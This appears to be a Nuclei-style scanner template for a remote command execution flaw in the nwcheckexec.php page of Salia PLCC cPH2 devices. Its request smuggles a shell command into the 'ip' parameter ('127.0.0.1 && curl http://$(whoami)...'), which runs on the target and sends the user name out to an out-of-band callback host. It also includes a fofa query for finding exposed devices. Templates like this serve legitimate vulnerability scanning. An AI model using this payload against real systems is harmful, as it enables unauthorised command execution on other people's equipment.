id: salia-plcc-cph2-nwcheckexec-rce
info:
  name: Salia PLCC cPH2 nwcheckexec.php 远程命令执行漏洞
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/2668b8cec9d13c85910a1df09359d3bdcee6bab7/wpoc/Salia/Salia%20PLCC%20cPH2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: false
    fofa-query: body="Salia PLCC"
    tips:
    repair:
    version:
  tags: cve2023,cve,salia-plcc,cph2,rce,hardy-barth,oob

http:
  - method: GET
    path:
      - "{{BaseURL}}/nwcheckexec.php?ip={{url_encode('127.0.0.1 && curl http://$(whoami).{{interactsh-url}}')}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<b>SUCCESS</b>"
          - "127.0.0.1 && curl http://$(whoami).{{interactsh-url}}"
        condition: and

      - type: status
        status:
          - 200

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
